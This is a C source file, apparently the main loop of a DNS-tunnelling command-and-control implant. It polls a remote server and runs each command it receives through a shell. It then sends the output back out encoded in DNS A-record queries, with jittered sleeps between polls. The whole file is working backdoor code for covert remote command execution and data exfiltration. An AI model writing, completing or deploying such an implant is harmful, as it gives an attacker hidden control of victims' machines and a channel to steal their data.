#include <stdlib.h>
#include <time.h>
#include <signal.h>

#include "util/debug.h"
#include "client.h"
#include "util/utils.h"

static int keep_running = 1;

void int_handler() {
    Dprintf("[d] caught SIGINT, stopping\n");
    keep_running = 0;
}

void implant() {

    struct Client *client = init_client();
    Dprintf("[d] booting agent for %s\n", client->domain);

    while (keep_running) {

        poll(client);

        switch (client->status) {
            case Idle:
                break;

            case Command:
                Dprintf("[d] we have the '%s' command to execute!\n", client->command);
                char *output = shell_exec_output(client->command);
                Dprintf("[d] command output:\n\n%s\n", output);

                int response_bytes_len = 0;
                char *response_bytes = str_to_response_bytes(client, output, &response_bytes_len);

                int req_len = 0;
                char **req = payload_to_dns_a(response_bytes, response_bytes_len, &req_len);
                int status = send_response(client, req, req_len);
                if (status != 0) {
                    Dprintf("[d] server failed to accepted our response data");
                }

                free(client->command);
                free(output);
                free(response_bytes);
                free(req);

                client->status = Idle;
                break;

            case Error:
                Dprintf("[e] the server indicated an error occurred, resetting");
                client->status = Idle;
                break;

            default:
                Dprintf("[e] something is wrong, client reached an unknown status");
                break;
        }

        Dprintf("[d] client status is: %d\n", client->status);
        jitter_sleep();
    }
}

int main() {

    srand(time(NULL) * 1);

    struct sigaction act;
    act.sa_handler = int_handler;
    sigaction(SIGINT, &act, NULL);

    implant();

    return 0;
}
